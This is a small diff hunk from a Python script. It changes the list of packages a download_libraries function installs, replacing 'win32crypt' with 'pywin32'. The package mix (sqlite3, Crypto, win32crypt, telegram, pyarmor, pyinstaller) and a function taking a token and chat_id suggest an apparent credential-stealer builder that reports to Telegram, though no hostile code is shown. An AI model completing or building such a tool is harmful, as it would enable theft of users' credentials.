@@ -20,8 +20,8 @@ def modificar_archivo(file_path, token, chat_id):
 def download_libraries():
     required_libraries = [
         'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
-        'subprocess', 'pyarmor', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 'zipfile', 'telegram', 'win32crypt',
-        'Crypto', 'datetime'
+        'subprocess', 'pyarmor', 'pyinstaller', 'glob', 're', 'platform', 'Pillow', 'zipfile', 'telegram',
+        'Crypto', 'datetime', "pywin32"
     ]
 
     for library in required_libraries:
